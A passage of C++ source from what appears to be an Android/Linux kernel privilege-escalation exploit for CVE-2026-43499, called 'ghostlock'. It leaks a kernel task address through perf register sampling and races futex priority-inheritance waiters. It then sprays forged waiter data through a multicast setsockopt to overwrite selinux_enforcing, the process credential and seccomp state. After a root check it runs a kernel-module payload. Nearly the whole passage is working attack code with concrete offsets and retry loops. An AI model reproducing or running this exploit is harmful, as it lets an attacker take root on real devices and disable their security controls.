        std::printf("run-temp: discovery ok=%d mm_struct=0x%lx page_base=0x%lx\n", report.ok ? 1 : 0,
                    static_cast<unsigned long>(report.mm_struct),
                    static_cast<unsigned long>(prepared.base));
        if (!report.ok) {
            std::printf("run-temp: no object was found; stopping before the write\n");
            return 15;
        }

        /* 9. What the write lands on: the object the search found, the page the preparation made
         *    ready, and the two addresses the landing gear presents. The readiness gate is the
         *    existing one, and it answers by name which of the four is missing. */
        backend::cve_2026_43499::TargetState target{};
        target.mm_struct = report.mm_struct;
        target.page_base = prepared.base;
        target.fake_task = offsets.fake_task_offset;
        target.fake_lock = offsets.lock_offset;
        const backend::cve_2026_43499::WriteReadiness readiness =
            backend::cve_2026_43499::write_readiness(target);
        std::printf("run-temp: readiness %s mm_struct=0x%lx page_base=0x%lx task=0x%lx lock=0x%lx\n",
                    backend::cve_2026_43499::write_readiness_name(readiness),
                    static_cast<unsigned long>(target.mm_struct),
                    static_cast<unsigned long>(target.page_base),
                    static_cast<unsigned long>(target.fake_task),
                    static_cast<unsigned long>(target.fake_lock));
        if (readiness != backend::cve_2026_43499::WriteReadiness::Ready) {
            std::printf("run-temp: the write is not ready; stopping before the steps\n");
            return 16;
        }
        /* 10. The three field addresses, base plus the profile's offsets. TEMPORARY: the offsets are
         *     the declared ones this run carries; the real path reads them from the profile. */
        /* The three field addresses, from two different sources: selinux_enforcing and the
         *  credential come from the profile offsets through the platform geometry, and the seccomp
         *  field is thread_info.flags at the process own task, which is why it needs the task
         *  and the other two do not. */
        /* 12d. The task address, taken the way the perf seam probe takes it: software CPU clock,
         *      samples carrying the interrupted register set with a thirty-two bit mask, the ring
         *      walked and the register words voted on. The window is the measured one. The retired
         *      rule holds: a real leak reproduces, so three samples are taken and any two that agree
         *      are the answer; without agreement it is discarded. TEMPORARY: the window, the spin
         *      count and the map size are declared here and registered with the rest. */
        /* The window is measured, not taken from a table: the tree declares {0xffff800000000000,
         *  0xffffc88000000000} and nothing is kept with it on this device, because the sampled words
         *  come back above that ceiling. TEMPORARY: declared here, registered with the rest. */
        const backend::cve_2026_43499::DirectMapBounds measured_bounds{0xffffff0000000000ULL,
                                                                     0xffffffffffffffffULL};
        memory::KeyValue kernel_flag_pairs[1] = {};
        const char *const kernel_flag_names[1] = {"compact_waiter"};
        const auto kernel_flag_read = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.kernel"), kernel_flag_names, 1U,
            kernel_flag_pairs, 1U);
        std::printf("run-temp: compact_waiter filled=%zu value=%lu", kernel_flag_read.filled,
                    static_cast<unsigned long>(kernel_flag_pairs[0].value));
        (void) std::putchar(10);
        constexpr std::size_t kSpinRounds = 500000U;
        auto lookup_own_task = [&](std::size_t &votes) -> std::uint64_t {
            backend::cve_2026_43499::PerfOpenArgs perf_args{};
            perf_args.type = PERF_TYPE_SOFTWARE;
            perf_args.config = backend::cve_2026_43499::kPerfCountSwCpuClock;
            perf_args.sample_period = 5000U;
            perf_args.pid = 0;
            perf_args.cpu = -1;
            perf_args.sample_type = backend::cve_2026_43499::kPerfSampleIpBit |
                                    backend::cve_2026_43499::kPerfSampleRegsIntrBit;
            perf_args.sample_regs_intr = (1ULL << 32U) - 1ULL;
            perf_args.start_disabled = true;
            perf_args.exclude_user = false;
            perf_args.exclude_hv = true;
            perf_args.exclude_idle = true;
            const auto opened = backend::cve_2026_43499::LinuxPerfSeam::perf_open(perf_args);
            if (opened.value < 0) {
                return 0U;
            }
            const auto fd = static_cast<std::int32_t>(opened.value);
            auto *const base = static_cast<unsigned char *>(
                backend::cve_2026_43499::LinuxPerfSeam::perf_map(fd, 9U * 4096U));
            if (base == nullptr) {
                (void) backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
                return 0U;
            }
            auto page_word = [&](std::size_t at) -> std::uint64_t {
                std::uint64_t value = 0U;
                for (std::size_t i = 0U; i < 8U; ++i) {
                    value |= static_cast<std::uint64_t>(base[at + i]) << (8U * i);
                }
                return value;
            };
            const std::uint64_t data_offset = page_word(backend::cve_2026_43499::kPerfDataOffsetOffset);
            const std::uint64_t data_size = page_word(backend::cve_2026_43499::kPerfDataSizeOffset);
            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
                fd, backend::cve_2026_43499::kPerfEventIocEnable);
            for (std::size_t i = 0U; i < kSpinRounds; ++i) {
                (void) backend::cve_2026_43499::LinuxPerfSeam::spin_once();
            }
            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
                fd, backend::cve_2026_43499::kPerfEventIocDisable);
            const std::uint64_t head = page_word(backend::cve_2026_43499::kPerfDataHeadOffset);
            backend::cve_2026_43499::RingView ring{};
            ring.buffer = base + data_offset;
            ring.data_size = static_cast<std::size_t>(data_size == 0U ? 4096U * 8U : data_size);
            ring.tail = 0U;
            ring.head = head;
            std::uint64_t candidates[backend::cve_2026_43499::kCandidateCapacity] = {};
            const auto outcome = backend::cve_2026_43499::walk_perf_ring(
                ring, measured_bounds, candidates, backend::cve_2026_43499::kCandidateCapacity);
            (void) backend::cve_2026_43499::LinuxPerfSeam::perf_ioctl(
                fd, backend::cve_2026_43499::kPerfEventIocDisable);
            (void) backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
            const std::uint64_t winner =
                backend::cve_2026_43499::vote_for_task(candidates, outcome.kept);
            votes = 0U;
            for (std::size_t i = 0U; i < outcome.kept; ++i) {
                if (candidates[i] == winner) {
                    ++votes;
                }
            }
            return winner;
        };
        /* The retired tree retried when the leak did not reproduce, and this loop does the same:
         *  an attempt takes three samples and accepts any two that agree, and another attempt is
         *  only made while nothing has been accepted. */
        std::uint64_t own_task = 0U;
        for (int attempt = 0; attempt < 4 && own_task == 0U; ++attempt) {
            std::size_t votes_first = 0U;
            std::size_t votes_second = 0U;
            std::size_t votes_third = 0U;
            const std::uint64_t task_first = lookup_own_task(votes_first);
            const std::uint64_t task_second = lookup_own_task(votes_second);
            const std::uint64_t task_third = lookup_own_task(votes_third);
            std::printf("run-temp: perf task: 0x%lx (%zu/256 votes)", static_cast<unsigned long>(task_first), votes_first);
            (void) std::putchar(10);
            std::printf("run-temp: perf task: 0x%lx (%zu/256 votes)", static_cast<unsigned long>(task_second), votes_second);
            (void) std::putchar(10);
            std::printf("run-temp: perf task: 0x%lx (%zu/256 votes)", static_cast<unsigned long>(task_third), votes_third);
            (void) std::putchar(10);
                own_task =
                task_first != 0U && task_first == task_second ? task_first
                : task_first != 0U && task_first == task_third  ? task_first
                : task_second != 0U && task_second == task_third ? task_second
                                                                 : 0U;
            std::printf("run-temp: own task=0x%lx agreed=%d", static_cast<unsigned long>(own_task), own_task != 0U ? 1 : 0);
        }
        (void) std::putchar(10);
        backend::cve_2026_43499::steps::StepTargets step_targets{};
        step_targets.selinux_enforcing = static_cast<std::uintptr_t>(offset_to_direct(offset_pairs[0].value));
        /* The credential and the seccomp field are task-relative, at the retired table positions;
         *  the image-relative translation is not what they want. TEMPORARY: declared here. */
        step_targets.credential = static_cast<std::uintptr_t>(own_task) + 0x820U;
        step_targets.seccomp_mode = static_cast<std::uintptr_t>(own_task) + 0x8e8U;
        std::printf("run-temp: step targets selinux=0x%lx cred=0x%lx seccomp=0x%lx",
                    static_cast<unsigned long>(step_targets.selinux_enforcing),
                    static_cast<unsigned long>(step_targets.credential),
                    static_cast<unsigned long>(step_targets.seccomp_mode));
        (void) std::putchar(10);
        std::uint32_t step_target_word = 0U;
        std::uint32_t step_chain_word = 0U;
        /* The word the waiter parks on, which is not the chain it locks: the retired tree keeps
         *  those apart, and the kernel walks a different path when they are the same word. */
        std::uint32_t step_wait_word = 0U;
        /* One lock word and one park word for each waiter. A single shared lock word lets only the
         *  first waiter hold it, and the others then fail to lock at all. */
        std::uint32_t step_chain_words[3] = {};
        std::uint32_t step_wait_words[3] = {};
        backend::cve_2026_43499::memory::WaiterFieldOffsets waiter_offsets{};
        /* The three words the fragment carries, at the retired layout positions: the waiter tree
         *  priority, its deadline, and the pi-tree entry. The retired encoder writes the same
         *  three, which is the confirmation. TEMPORARY: declared here, registered with the rest. */
        waiter_offsets.pc = 0x18U;
        waiter_offsets.right = 0x20U;
        waiter_offsets.left = 0x28U;
        /* The fragment must reach the waiter base plus one word: the retired tree writes a single
         *  word there and comments it as tree_entry.rb_parent_color, whose low bit is the node
         *  colour. Red is the value it uses, and without it the colour fixup runs and the write
         *  does not land. TEMPORARY: the size and the base offset are declared here. */
        std::uint8_t fragment[256] = {};
        fragment[offsets.waiter_w0_offset] = 1U;
        backend::cve_2026_43499::race::PiRace<backend::cve_2026_43499::race::LinuxFutexSeam> race;
        backend::cve_2026_43499::race::WindowGuard race_window;
        /* The values the layout chooses between, from the retired tree's own formula: the payload
         *  base is the prepared page minus the delta, the two file-operation tables sit at their
         *  profile offsets from it, the page value is a fixed distance into the page, and the
         *  credential alias is the kernel's static credential through the image translation. */
        const std::uintptr_t payload_base =
            static_cast<std::uintptr_t>(prepared.base) - 0xe80U;
        backend::cve_2026_43499::memory::LayoutInputs layout_inputs{};
        layout_inputs.page_value = static_cast<std::uintptr_t>(prepared.base) + 0x100U;
        layout_inputs.default_fops = payload_base + offsets.fops_table_offset;
        layout_inputs.credential_fops = payload_base + offsets.cred_copy_offset;
        layout_inputs.credential_value =
            static_cast<std::uintptr_t>(offset_to_direct(offset_pairs[2].value));
        std::printf("run-temp: layout inputs payload_base=0x%lx page=0x%lx fops=0x%lx cfops=0x%lx cred=0x%lx",
                    static_cast<unsigned long>(payload_base),
                    static_cast<unsigned long>(layout_inputs.page_value),
                    static_cast<unsigned long>(layout_inputs.default_fops),
                    static_cast<unsigned long>(layout_inputs.credential_fops),
                    static_cast<unsigned long>(layout_inputs.credential_value));
        (void) std::putchar(10);
        backend::cve_2026_43499::steps::RaceAction<backend::cve_2026_43499::race::LinuxFutexSeam>
            action{race, race_window, waiter_offsets, step_targets, fragment, sizeof(fragment), 8U, 0U,
                   &step_wait_word, &step_target_word, layout_inputs};
        /* The retired route repeats: the arm only starts once the earlier copies have overwritten
         *  each other, and between the copy and the walk the thread only yields, so the poisoned
         *  frame survives. The counts are the ones the retired comment records for this geometry:
         *  attempts, the sequence before the arm, and the hold. TEMPORARY: declared here. */
        constexpr int32_t kMulticastMaxAttempts = 128;
        constexpr int32_t kMulticastArmSequence = 16;
        constexpr int32_t kMulticastArmHold = 20000;
        int32_t attempts_used = 0;
        /* The waiter tid the consumer aims at, kept outside the attempts loop because the
         *  waiters themselves are parked inside it. */
        std::int32_t first_waiter_tid = 0;
        ConsumerState consumer_state{};
        pthread_t consumer_thread{};
        bool consumer_started = false;
        OwnerState owner_state{};
        pthread_t owner_thread{};
        /* The parked waiters, kept visible outside the attempts loop so they can be released once the
         *  consumer is finished with them. */
        HandshakeWaiter *waiters_out = nullptr;
        std::int32_t waiters_count = 0;
        ghostlock::pipeline::PathRun ran{};
        for (int32_t attempt = 1; attempt <= kMulticastMaxAttempts; ++attempt) {
            ++attempts_used;
            for (int32_t spin = 0; spin < kMulticastArmHold; ++spin) {
                ::sched_yield();
            }
        ghostlock::pipeline::Cve43499W1W3_RootChild<decltype(action)> executor{action};
            /* 12c. The waiter the steps need: a requeue consumes the waiter it moves, so one per step. */
            constexpr int kStepWaiters = 3;
            HandshakeWaiter step_waiters[kStepWaiters] = {};
        waiters_out = step_waiters;
        waiters_count = kStepWaiters;
            pthread_t step_waiter_threads[kStepWaiters] = {};
            int step_waiters_started = 0;
        /* The three threads are created once; later attempts only bump their arm counter. */
            if (attempt == 1) {
                owner_state.target = &step_target_word;
                owner_state.chain = &step_chain_word;
                (void) ::pthread_create(&owner_thread, nullptr, owner_main, &owner_state);
            }
            for (int i = 0; i < kStepWaiters; ++i) {
                step_waiters[i].chain = &step_chain_words[i];
                step_waiters[i].target = &step_target_word;
                step_waiters[i].wait = &step_wait_words[i];
                if (::pthread_create(&step_waiter_threads[i], nullptr, handshake_waiter_main,
                                     &step_waiters[i]) == 0) {
                    ++step_waiters_started;
                }
            }
            /* Every attempt only bumps the arm counter, so three threads serve them all. */
        for (std::int32_t w = 0; w < kStepWaiters; ++w) {
            /* TODO(volatile-counter-warning): preserve the atomic-looking single-thread handoff
             * while avoiding deprecated volatile increment syntax in the Android compiler. */
            step_waiters[w].arm = step_waiters[w].arm + 1;
        }
        int step_waiters_parked = 0;
            for (int i = 0; i < kStepWaiters; ++i) {
                for (int spin = 0; spin < 20000 && step_waiters[i].stage == 0; ++spin) {
                    ::sched_yield();
                }
                if (step_waiters[i].stage == 1) {
            if (first_waiter_tid == 0) { first_waiter_tid = step_waiters[i].tid; }
            /* The consumer must live while the waiters do: it aims at a parked one, and a thread
             *  that has already returned is ESRCH. */
            if (consumer_started == false && first_waiter_tid != 0) {
                consumer_state.waiter_tid = first_waiter_tid;
                consumer_started =
                    ::pthread_create(&consumer_thread, nullptr, consumer_main, &consumer_state) == 0;
            }
                    ++step_waiters_parked;
                }
            }
            std::printf("run-temp: step waiters started=%d parked=%d of=%d", step_waiters_started,
                        step_waiters_parked, kStepWaiters);
        owner_state.waiters_seen = step_waiters_parked;
        while (owner_state.owner_started == 0) { ::sched_yield(); }
        for (std::int32_t g = 0; g < kStepWaiters; ++g) { step_waiters[g].owner_started = 1; }

            (void) std::putchar(10);
            /* The arm must not fire until the waiters are in the futex queue: stage is set before
             *  they lock, so a settle is what makes the pairing likely at all. The retired tree
             *  waits for waiter_waiting and then sleeps for the same reason. TEMPORARY: 2 ms. */
            ::usleep(2000);
            race_window.enter(contract::ExitPath::Success);
            /* The retired route arms only after the earlier copies have overwritten each other:
             *  the sequence count is the number of copies that go first. A copy encodes the same
             *  arm into the fragment without running the attempt. */
            const bool arm_now = attempt > kMulticastArmSequence;
            if (arm_now) {
                ran = executor.run();
            } else {
                const auto request_copy = backend::cve_2026_43499::steps::request_for(
                    contract::StepId::DisenforceSelinux, step_targets);
                const auto layout_copy = backend::cve_2026_43499::memory::write_layout(
                    request_copy, layout_inputs);
                const auto arm_copy = backend::cve_2026_43499::memory::arm_for(
                    request_copy, layout_copy.value, sizeof(std::uintptr_t));
                (void) backend::cve_2026_43499::memory::encode_waiter_arm(
                    fragment, sizeof(fragment), waiter_offsets, arm_copy, sizeof(std::uintptr_t));
            }
            std::printf("run-temp: step waiter results %d %d %d", step_waiters[0].result,
                        step_waiters[1].result, step_waiters[2].result);
            (void) std::putchar(10);
            /* The criterion is the effect, not the chain answer: the retired loop verifies the
             *  observable and keeps going while it is unchanged. */
            if (effect_reached()) {
                break;
            }
        }
        std::printf("run-temp: attempts used=%d effect=%d", attempts_used, effect_reached() ? 1 : 0);
        (void) std::putchar(10);
        std::printf("run-temp: steps ok=%d stage=%d request=%s encode=%s race=%s", ran.ok ? 1 : 0,
                    static_cast<int>(action.last_stage()),
                    backend::cve_2026_43499::memory::request_verdict_name(action.last_request()),
                    backend::cve_2026_43499::memory::encode_verdict_name(action.last_encode()),
                    backend::cve_2026_43499::race::race_outcome_name(action.last_race()));
        (void) std::putchar(10);
        std::printf("run-temp: step results ok=%d ran=%zu stopped_at=%d", ran.steps.ok ? 1 : 0,
                    ran.steps.ran, static_cast<int>(ran.steps.stopped_at));
        (void) std::putchar(10);
        /* The write the retired route performs, as its own step: the stamp is a group_source_req
         *  shaped buffer, the two words are the payload addresses, and one setsockopt is one
         *  lottery ticket against skb page recycling. The geometry comes from the profile; absent
         *  geometry is a refusal rather than a guess. TEMPORARY: the four names are declared here. */
        memory::KeyValue mcast_pairs[4] = {};
        const char *const mcast_names[4] = {"waiter_off", "task_offset", "lock_offset", "buffer_size"};
        const auto mcast_read = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.route.multicast_waiter"), mcast_names, 4U,
            mcast_pairs, 4U);
        std::printf("run-temp: mcast geometry filled=%zu waiter=0x%lx task=0x%lx lock=0x%lx size=0x%lx",
                    mcast_read.filled, static_cast<unsigned long>(mcast_pairs[0].value),
                    static_cast<unsigned long>(mcast_pairs[1].value),
                    static_cast<unsigned long>(mcast_pairs[2].value),
                    static_cast<unsigned long>(mcast_pairs[3].value));
        (void) std::putchar(10);
        if (mcast_read.filled == 4U && mcast_pairs[3].value != 0U) {
            backend::cve_2026_43499::memory::MulticastGeometry mcast_geometry{};
            mcast_geometry.waiter_offset = static_cast<std::size_t>(mcast_pairs[0].value);
            mcast_geometry.task_offset = static_cast<std::size_t>(mcast_pairs[1].value);
            mcast_geometry.lock_offset = static_cast<std::size_t>(mcast_pairs[2].value);
            mcast_geometry.buffer_size = static_cast<std::size_t>(mcast_pairs[3].value);
            const std::uint64_t fake_task = payload_base + offsets.fake_task_offset;
            const std::uint64_t fake_lock = payload_base + offsets.lock_offset;
            std::uint8_t stamp_buffer[512] = {};
            std::uint8_t *const stamp = stamp_buffer;
            const std::uint16_t family = AF_UNSPEC;
            if (mcast_geometry.buffer_size >= 10U) {
                std::memcpy(stamp + 8U, &family, sizeof(family));
            }
            const auto encoded = backend::cve_2026_43499::memory::encode_multicast_arm(
                stamp, mcast_geometry.buffer_size, mcast_geometry, fake_task, fake_lock,
                sizeof(std::uintptr_t));
            std::printf("run-temp: mcast encode=%s fake_task=0x%lx fake_lock=0x%lx",
                        backend::cve_2026_43499::memory::arm_verdict_name(encoded),
                        static_cast<unsigned long>(fake_task), static_cast<unsigned long>(fake_lock));
            (void) std::putchar(10);
            /* The third actor: it sched_setattrs the waiter, which makes the kernel walk the PI
             *  chain where the poisoned waiter object sits. Started before the lottery loop and
             *  driven once per attempt; its success count is the only thing that makes a write
             *  count as landed. */

            const int sock = ::socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
            if (sock >= 0) {
                int32_t stamp_result = -1;
                for (int32_t attempt = 1; attempt <= kMulticastMaxAttempts; ++attempt) {
                    for (int32_t spin = 0; spin < kMulticastArmHold; ++spin) { ::sched_yield(); }
                    consumer_state.go = attempt;
                    if (attempt > kMulticastArmSequence) {
                        stamp_result = ::setsockopt(sock, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp,
                                                    static_cast<socklen_t>(mcast_geometry.buffer_size));
                    }
                    if (effect_reached()) { break; }
                }
                std::printf("run-temp: mcast stamp_result=%d errno=%d effect=%d", stamp_result, errno,
                            effect_reached() ? 1 : 0);
                (void) std::putchar(10);
                owner_state.stop = 1;
                ::pthread_join(owner_thread, nullptr);
                for (std::int32_t i = 0; i < waiters_count; ++i) {
                    waiters_out[i].release = 1;
                }
                consumer_state.stop = 1;
                if (consumer_started) { ::pthread_join(consumer_thread, nullptr); }
                std::printf("run-temp: consumer calls=%d successes=%d verdict=%s errno=%d",
                            consumer_state.calls, consumer_state.successes, consumer_state.verdict,
                            consumer_state.errno_value);
                (void) std::putchar(10);
                (void) ::close(sock);
            }
        }
        const bool ever_rooted = ::getuid() == 0;
        std::printf("run-temp: terminal gate ever_rooted=%d uid=%d", ever_rooted ? 1 : 0,
                    static_cast<int>(::getuid()));
        (void) std::putchar(10);
        if (!ever_rooted) {
            std::printf("run-temp: w2 never rooted a child; the terminal is not dispatched");
            (void) std::putchar(10);
            return 21;
        }
        constexpr const char *kDevPayload = "/data/local/tmp/ghostlock.ko";
        const ghostlock::terminal::ExecResult executed =
            ghostlock::terminal::run_payload(kDevPayload);
        std::printf("run-temp: terminal ok=%d exit=%d reason=%s", executed.ok ? 1 : 0,
                    executed.exit_code, executed.reason);
        (void) std::putchar(10);
        return executed.ok ? 0 : 19;
#else
        /* The discovery runs the search, which needs the device seam and the words the */
        /* cohort hammers; the host has neither, so this step is named and refused. */
        std::printf("run-temp: the discovery needs a device; stopping before it\n");
        return 13;
#endif





        return 0;
    }
}  // namespace ghostlock::pipeline
